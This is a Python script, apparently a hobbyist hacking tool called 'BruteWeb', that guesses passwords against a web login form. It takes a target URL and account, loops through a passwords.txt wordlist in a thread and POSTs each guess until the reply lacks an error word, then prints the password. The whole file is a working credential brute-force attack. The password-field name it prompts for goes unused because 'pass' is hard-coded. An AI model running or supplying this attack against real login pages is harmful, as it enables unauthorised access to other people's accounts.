# Author : Hunter87
# Github : https://github.com/hunter87ff
# Insta  : https://instagram.com/im_hunter87
# Youtube: https://youtube.com/@hunter87

import requests, sys, os, time
import threading, argparse
req = requests
lgr='\033[1;32m' 
red='\033[0;31m' 
cyan='\033[36m' 
blue='\033[34m'
NC='\033[0m'
banner = f"""{red}
  ____             _     __        __   _     
 | __ ) _ __ _   _| |_ __\ \      / /__| |__  
 |  _ \| '__| | | | __/ _ \ \ /\ / / _ \ '_ \ 
 | |_) | |  | |_| | ||  __/\ V  V /  __/ |_) |
 |____/|_|   \__,_|\__\___| \_/\_/ \___|_.__/ 
                                             
                          {lgr}-By Hunter87ff 
{NC}"""
print(banner)
def is_incorrect(res):
	error = ["incorrect", "wrong", "invalid", "not found"]
	for err in error:
		if err in res.lower():
			return True
def crack(url, target, dest, psw):
	count = 1
	for i in psw:
		data = {f"{target}":f"{dest}", "pass":f"{i}"}
		res = req.post(url, data, timeout=1).text
		if is_incorrect(res):
			print(f"{count}) Failed {i}")
		else:
			print(f"{lgr}Password Is : {i}{NC}")
			return True
		count += 1
def main():
	url = input("Enter Url : ")
	target = input("Target (eg: email, username): ")
	dest = input("Target destination (eg: hunter87, h87@hunter87.io): ")
	passw = input("Password parameter (eg: pass, psw, password) :")
	chunk = 10000
	load = f"""{red}Starting Attack : 
█████████████████████████████████████████████████\n"""
	for x in load:
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.02)
	with open("passwords.txt", "r") as f:
		passwords = f.read().split("\n")[0:chunk]
		t = threading.Thread(target=crack, args=(url, target, dest, passwords, ))
		t.start()
main()
